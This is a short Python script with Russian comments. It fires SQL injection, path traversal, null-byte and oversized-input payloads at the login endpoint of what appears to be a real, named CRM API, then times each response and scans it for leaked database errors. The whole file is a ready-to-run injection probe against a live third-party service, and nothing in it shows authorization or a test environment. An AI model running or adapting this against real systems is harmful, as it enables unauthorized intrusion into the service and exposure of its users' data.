#!/usr/bin/env python3
import requests, time, json

URL = "https://api.crm.carsindigo.com/api/auth.login?batch=1"
HEADERS = {"Content-Type":"application/json"}

payloads = [
    {"username":"normal.user","password":"normal"},
    {"username":"'","password":"x"},
    {"username":"\"","password":"x"},
    {"username":"; DROP TABLE users; --","password":"x"},   # тестовая строка для обнаружения уязвимости, не выполняет сам DROP на стороне клиента
    {"username": "A"*5000, "password":"x"},
    {"username":"admin' OR '1'='1","password":"x"},
    {"username":"%00","password":"x"},
    {"username":"../etc/passwd","password":"x"},
]

def wrap(p):
    return json.dumps({"0": {"json": {"username": p["username"], "password": p["password"]}}})

for p in payloads:
    data = wrap(p)
    t0 = time.time()
    r = requests.post(URL, headers=HEADERS, data=data, timeout=15)
    dt = time.time() - t0
    body = r.text[:1000].replace("\n"," ")
    print(f"PAYLOAD={p['username'][:60]:60} | STATUS={r.status_code} | TIME={dt:.2f}s | LEN={len(r.text)}")
    # быстрый check на присутствие SQL-errors
    if any(x in body.lower() for x in ["syntax error", "sql", "psycopg", "mysql", "unterminated", "stack trace", "exception"]):
        print("  >>> POSSIBLE DB ERROR IN RESPONSE:", body[:400])
